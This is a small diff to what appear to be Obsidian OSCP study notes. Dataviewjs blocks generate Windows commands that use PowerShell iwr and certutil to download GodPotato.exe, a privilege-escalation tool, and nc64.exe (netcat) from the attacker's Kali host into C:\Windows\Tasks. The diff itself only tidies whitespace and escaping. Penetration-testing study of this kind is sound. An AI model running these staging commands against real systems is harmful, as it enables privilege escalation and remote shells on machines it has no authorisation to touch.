@@ -74,7 +74,7 @@ POWERSHELL
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = ` iwr -uri http://${KaliIP}/GodPotato.exe -OutFile C:\Windows\Tasks\GodPotato.exe`;
+const command = `iwr -uri http://${KaliIP}/GodPotato.exe -OutFile C:\Windows\Tasks\GodPotato.exe`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -112,7 +112,7 @@ nc64.exe
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `C:\\\Windows\\\System32\\\certutil.exe -urlcache -split -f http://${KaliIP}/nc64.exe C:\\\Windows\\\Tasks\\\nc.exe`;
+const command = `C:\\\Windows\\\System32\\\certutil.exe -urlcache -split -f http://${KaliIP}/nc64.exe C:\\\Windows\\\Tasks\\nc.exe`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
